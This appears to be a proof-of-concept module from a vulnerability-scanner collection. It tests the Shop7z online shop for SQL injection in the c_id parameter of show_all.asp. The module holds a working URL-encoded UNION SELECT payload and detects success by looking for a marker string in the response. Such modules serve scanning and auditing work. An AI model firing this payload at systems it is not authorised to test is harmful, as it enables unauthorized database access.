# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Shop7z_0006'  # 平台漏洞编号，留空
    name = 'Shop7z SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-22'  # 漏洞公布时间
    desc = '''
        Shop7z网上购物系统是国内优秀的网上开店软件，模板新颖独特，功能强大，自主知识产权国家认证，数万用户网上开店首选，可以快速建立自己的网上商城。
        Shop7z show_all.asp c_id参数SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=076977'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shop7z'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1eb73417-8b1a-49da-a1e5-71baae568ee1'  # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/show_all.asp?c_id=7685%20UNION%20SELECT%201%2C2%2C3%2CCHR%2832%29%2bCHR%2835%29%2bCHR%28116%29%2bCHR%28121%29%2bCHR%28113%29%2bCHR%2835%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20from%20%20MSysAccessObjects'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and '#tyq#' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
